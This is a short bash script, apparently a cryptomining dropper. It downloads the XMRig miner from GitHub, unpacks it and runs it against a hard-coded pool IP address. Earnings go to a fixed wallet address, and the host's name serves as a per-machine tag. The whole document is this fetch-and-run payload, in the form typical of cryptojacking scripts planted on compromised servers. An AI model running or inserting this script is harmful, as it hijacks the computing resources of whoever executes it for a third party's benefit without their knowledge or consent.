#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig -o 139.59.107.181:1515 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 --keepalive --donate-level 1 -p $(cat /proc/sys/kernel/hostname) -k --tls
